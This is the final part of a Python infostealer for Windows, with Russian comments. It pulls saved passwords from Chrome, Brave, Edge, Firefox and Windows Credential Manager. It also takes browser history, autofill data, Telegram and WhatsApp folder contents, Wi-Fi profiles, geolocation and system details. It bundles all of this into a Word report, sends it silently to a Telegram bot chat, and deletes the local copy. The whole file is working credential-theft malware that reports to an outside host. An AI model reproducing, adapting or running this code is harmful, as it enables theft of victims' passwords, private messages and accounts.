                    os.remove(temp_db)
                except Exception as e:
                    results.append(f"Error reading profile '{folder_name}': {e}")
                    if os.path.exists(temp_db):
                        os.remove(temp_db)

    if not profiles_found:
        return ["Edge passwords: No profile folders found (no Login Data files)"]

    return results if results else ["Edge passwords: None found"]

def get_brave_history():
    """
    Извлекает историю браузера Brave (все профили).
    Возвращает список записей (title + url), упрощённо.
    """
    results = []

    brave_user_data_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "BraveSoftware",
        "Brave-Browser",
        "User Data"
    )
    if not os.path.exists(brave_user_data_path):
        return ["Brave: User Data not found"]

    profiles_found = False
    for folder_name in os.listdir(brave_user_data_path):
        folder_full = os.path.join(brave_user_data_path, folder_name)
        if os.path.isdir(folder_full):
            history_db = os.path.join(folder_full, "History")
            if os.path.exists(history_db):
                profiles_found = True
                temp_db = "BraveHistoryData_temp"
                try:
                    shutil.copyfile(history_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    # В таблице urls хранится id, url, title, visit_count и т.д.
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")
                    for row in cursor.fetchall():
                        url, title, vcount, last_visit = row
                        results.append(
                            f"Profile: {folder_name}, Title: {title}, URL: {url}, Visits: {vcount}"
                        )
                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    results.append(f"Error reading profile '{folder_name}' history: {e}")
                    if os.path.exists(temp_db):
                        os.remove(temp_db)

    if not profiles_found:
        return ["Brave History: No history files found"]

    return results if results else ["Brave History: Empty"]

def get_whatsapp_data():
    """Пример получения данных WhatsApp (список файлов в %AppData%/WhatsApp)."""
    try:
        whatsapp_path = os.path.join(os.environ["APPDATA"], "WhatsApp")
        if not os.path.exists(whatsapp_path):
            return ["WhatsApp: Data not found"]
        files = os.listdir(whatsapp_path)
        return [f"WhatsApp file: {file}" for file in files] if files else ["WhatsApp: No accessible data"]
    except Exception:
        return ["WhatsApp: Failed to retrieve"]

def get_telegram_data():
    """Пример получения данных Telegram Desktop (список файлов в папке tdata)."""
    try:
        telegram_path = os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")
        if not os.path.exists(telegram_path):
            return ["Telegram: Data not found"]
        files = os.listdir(telegram_path)
        return [f"Telegram file: {file}" for file in files] if files else ["Telegram: No accessible data"]
    except Exception:
        return ["Telegram: Failed to retrieve"]

def get_chrome_addresses():
    """Пример извлечения автозаполненных адресов из Chrome (таблица autofill в Web Data)."""
    try:
        chrome_db = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
            "Default",
            "Web Data"
        )
        if not os.path.exists(chrome_db):
            return ["Chrome addresses: Database not found"]
        temp_db = "WebData_temp"
        shutil.copyfile(chrome_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM autofill")
        addresses = []
        for row in cursor.fetchall():
            addresses.append(str(row))  # Пример выводим сырые данные
        conn.close()
        os.remove(temp_db)
        return addresses if addresses else ["Chrome addresses: None found"]
    except Exception:
        return ["Chrome addresses: Failed to retrieve"]

# ===============================
#  Сбор всех данных по разделам
# ===============================
def collect_all_info():
    try:
        return {
            # -- Системная информация --
            "System Info": {
                "Computer Name": platform.node(),
                "Username": getpass.getuser(),
                "OS": platform.platform(),
                "OS Version": f"{platform.win32_ver()[0]} {platform.win32_ver()[1]}",
                "Architecture": platform.machine(),
                "Processor": platform.processor(),
                "Python Version": platform.python_version(),
                "System Language": platform.win32_ver()[2],
                "Boot Time": datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%d/%m/%Y %H:%M:%S")
            },

            # -- CPU --
            "CPU Info": {
                "Basic": get_cpu_detailed_info(),
                "Detailed": get_cpu_detailed()
            },

            # -- GPU --
            "GPU Info": {
                "Basic": get_gpu_info(),
                "Detailed": get_gpu_detailed()
            },

            # -- Сеть --
            "Network Info": {
                "Local IP": socket.gethostbyname(socket.gethostname()),
                "MAC Address": ':'.join(f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 8*6, 8)[::-1]),
                "Hostname": socket.gethostname()
            },

            # -- Геолокация --
            "Geolocation": get_geolocation(),

            # -- Текущий Wi-Fi --
            "Wi-Fi Info": get_wifi_info(),

            # -- Информация о памяти --
            "Memory Info": {
                "Total Memory (GB)": round(psutil.virtual_memory().total / (1024 ** 3), 2),
                "Available Memory (GB)": round(psutil.virtual_memory().available / (1024 ** 3), 2),
            },

            # -- Использование диска --
            "Disk Usage": get_disk_usage(),

            # -- Батарея --
            "Battery Info": (
                [
                    f"Percent: {psutil.sensors_battery().percent}%",
                    f"Plugged: {'Yes' if psutil.sensors_battery().power_plugged else 'No'}",
                    f"Time Left: "
                    + (f"{psutil.sensors_battery().secsleft // 3600}h {(psutil.sensors_battery().secsleft % 3600) // 60}m"
                       if psutil.sensors_battery().secsleft != psutil.POWER_TIME_UNLIMITED
                       else "Unlimited")
                ]
                if psutil.sensors_battery() else
                ["Battery: Not detected"]
            ),

            # -- Разрешение экрана --
            "Screen Resolution": f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}",

            # -- BIOS --
            "BIOS Info": get_bios_info(),

            # -- Материнская плата --
            "Motherboard Info": get_motherboard_info(),

            # -- Установленные программы --
            "Installed Programs": get_installed_programs(),

            # -- Службы --
            "Services": get_services(),

            # -- Драйверы --
            "Drivers": get_drivers(),

            # -- USB-устройства --
            "USB Devices": get_usb_devices(),

            # -- Переменные окружения --
            "Environment Variables": get_environment_vars(),

            # -- Локальные пользователи --
            "Local Users": get_local_users(),

            # -- Локальные группы --
            "Local Groups": get_local_groups(),

            # -- Пароли Chrome --
            "Chrome Passwords": get_chrome_passwords(),

            "Brave Passwords": get_brave_passwords(),

            "Brave History": get_brave_history(),

            # -- Пароли Firefox --
            "Firefox Passwords": get_firefox_passwords(),

            # -- Диспетчер учётных данных --
            "Credential Manager": get_credential_manager_passwords(),

            # -- Пароли Edge --
            "Edge Passwords": get_edge_passwords(),

            # -- WhatsApp --
            "WhatsApp Data": get_whatsapp_data(),

            # -- Telegram --
            "Telegram Data": get_telegram_data(),

            # -- Автофил (адреса) из Chrome --
            "Chrome Addresses": get_chrome_addresses(),

            # -- Информация об устройстве --
            "Device Info": get_device_info(),

            # -- Мониторы --
            "Monitor Info": get_monitor_info(),

            # -- Доступные Wi-Fi сети --
            "Saved Wi-Fi Networks": get_all_saved_wifi(),

            # -- Bluetooth --
            "Bluetooth Info": get_bluetooth_info(),

            # -- RAM (через WMIC) --
            "RAM Info": get_ram_info(),

            # -- Информация о дисках (WMIC) --
            "Disk Info": get_disk_info(),

            # -- Процессы, связанные с сетью --
            "Process Info (Network)": get_process_info(),

            # -- Безопасность (логи, антивирус, активные сессии) --
            "Security Info": get_security_info(),

            # -- Учётные записи --
            "Account Info": get_account_info(),

            # -- Логи и отладка --
            "Logs and Debug Info": get_logs_and_debug_info(),

            # -- Дата и время --
            "DateTime": datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        }
    except Exception as e:
        return {"Error": f"Failed to collect all info. Error: {e}"}

def clean_text(text):
    """Очищаем текст от управляющих символов."""
    try:
        if not isinstance(text, str):
            text = str(text)
        return re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F]', '', text)
    except Exception:
        return "Not available"

def flatten_data(data, prefix=""):
    """Разворачивает структуру словаря/списка в удобный лист строк для записи в документ."""
    try:
        lines = []
        if isinstance(data, dict):
            for key, value in data.items():
                new_prefix = f"{prefix}{key}: " if not prefix else f"{prefix}{key}: "
                lines.extend(flatten_data(value, new_prefix))
        elif isinstance(data, list):
            for item in data:
                lines.extend(flatten_data(item, prefix))
        else:
            # Для простых типов
            lines.append(f"{prefix}{data}")
        return lines
    except Exception:
        return ["Not available"]

def create_word_file(info, filename):
    """Создаёт Word-файл с системной информацией."""
    try:
        doc = Document()
        doc.add_heading("User Data Report / Отчёт о системе", 0)

        # Для каждого ключа верхнего уровня создаём отдельный раздел
        for section, data in info.items():
            # Переводим название раздела, если есть
            section_trans = SECTION_TRANSLATIONS.get(section, section)
            section_title = f"{section} / {section_trans}"
            doc.add_heading(clean_text(section_title), level=1)

            # Разворачиваем данные в список строк
            lines = flatten_data(data)
            for line in lines:
                doc.add_paragraph(clean_text(line), style='List Bullet')

        doc.save(filename)
        return filename
    except Exception:
        return None

def send_file_to_telegram(file_path):
    """Отправляет файл в Telegram по API."""
    try:
        with open(file_path, 'rb') as file:
            response = requests.post(
                TELEGRAM_API_URL,
                data={
                    'chat_id': TELEGRAM_CONFIG["CHAT_ID"],
                    'disable_notification': True  # <-- Ключевой параметр
                },
                files={'document': file},
                timeout=10
            )
            print(response)
        if response.status_code == 200:
            print("File sent successfully!")
        else:
            print(f"Failed to send file. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending file: {e}")

def send_message_to_telegram(message):
    """Отправляет текстовое сообщение в Telegram (не обязательно)."""
    try:
        params = {
            'chat_id': TELEGRAM_CONFIG["CHAT_ID"],
            'text': str(message)
        }
        response = requests.post(TELEGRAM_MESSAGE_URL, data=params, timeout=10)
        if response.status_code != 200:
            raise Exception(f"Failed to send message. Status code: {response.status_code}")
    except Exception:
        # Ошибку не выбрасываем, чтобы не останавливать скрипт
        pass

def main():
    """Точка входа в скрипт."""
    try:
        """if not is_admin():
            print("Script not running as admin. Restarting...")
            if not restart_as_admin():
                print("Automatic restart failed. Please run as administrator.")
                return"""
        subprocess.run(
            'start powershell -NoExit -Command "cd C:\\Windows\\System32"',
            shell=True
        )
        info = collect_all_info()

        username = getpass.getuser()
        computer_name = platform.node()
        filename = f"{username}_{computer_name}.docx"

        # Сохраняем файл во временную папку (AppData)
        file_path = os.path.join(os.environ["APPDATA"], filename)

        created_file = create_word_file(info, file_path)
        if created_file:
            send_file_to_telegram(created_file)
            try:
                os.remove(file_path)
            except Exception as e:
                print(f"Error deleting file: {e}")
        else:
            print("Failed to create Word file.")

    except Exception as e:
        print(f"Main execution error: {e}")

if __name__ == "__main__":
    main()
